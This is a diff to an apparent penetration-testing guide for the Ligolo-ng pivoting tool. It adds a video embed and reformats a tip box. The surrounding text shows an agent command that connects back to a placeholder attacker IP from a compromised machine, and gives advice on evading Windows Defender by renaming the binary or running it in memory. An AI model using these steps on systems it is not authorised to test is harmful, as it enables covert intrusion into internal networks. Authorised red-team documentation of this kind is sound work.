@@ -13,11 +13,18 @@ This allows you to use your native tools (`nmap`, `crackmapexec`, `smbclient`, `
 !!! note
       **Source Repository:** [nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
 
+### Video Walkthrough
+
+<div style="margin: 2rem 0; border-radius: 8px; overflow: hidden; background: var(--ps-surface); border: 1px solid var(--ps-border);">
+  <iframe width="100%" style="aspect-ratio: 16/9; display: block;" src="https://www.youtube.com/embed/qou7shRlX_s?start=1072" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
+</div>
+
 ---
 
 ## 1. Architecture
 
 Ligolo-ng consists of two main components:
+
 *   **The Proxy (Attacker):** Runs on your attack machine. It manages the `TUN` interface and orchestrates traffic.
 *   **The Agent (Target):** Runs on the compromised machine. It connects back to the proxy and forwards packets into the internal network.
 
@@ -73,8 +80,8 @@ Transfer the agent binary to the compromised target (Windows or Linux) and conne
 ./agent -connect <ATTACKER_IP>:11601 -ignore-cert
 ```
 
-> [!TIP]
-> **OPSEC Consideration:** If deploying to a modern Windows environment, consider renaming the binary or using in-memory execution, as default Ligolo-ng binaries are often flagged by Windows Defender.
+!!! tip
+      **OPSEC Consideration:** If deploying to a modern Windows environment, consider renaming the binary or using in-memory execution, as default Ligolo-ng binaries are often flagged by Windows Defender.
 
 ### Activating the Tunnel
 
